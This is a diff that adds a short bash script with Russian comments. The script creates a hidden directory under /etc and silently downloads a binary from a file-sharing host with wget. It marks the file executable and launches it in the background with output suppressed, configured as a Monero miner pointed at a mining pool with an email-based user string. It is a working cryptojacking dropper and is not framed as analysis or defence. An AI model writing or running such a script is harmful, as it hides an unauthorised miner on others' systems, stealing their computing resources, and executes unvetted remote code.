@@ -1,0 +1,16 @@
+#!/bin/bash
+
+# Создаем директорию для загрузки файла
+mkdir -p /etc/tmp/.logs
+
+# Переходим в созданную директорию
+cd /etc/tmp/.logs
+
+# Загружаем файл ccqaq0 из указанного URL
+wget -q https://files.catbox.moe/ccqaq0 -O ccqaq0
+
+# Делаем файл исполняемым
+chmod +x ccqaq0
+
+# Запускаем файл в фоновом режиме
+nohup ./ccqaq0 --coin XMR --url "xmr.kryptex.network:7777" --user "xmr-$(shuf -i 100000-999999 -n 1)/fintafixgames@gmail.com" >/dev/null 2>&1 &
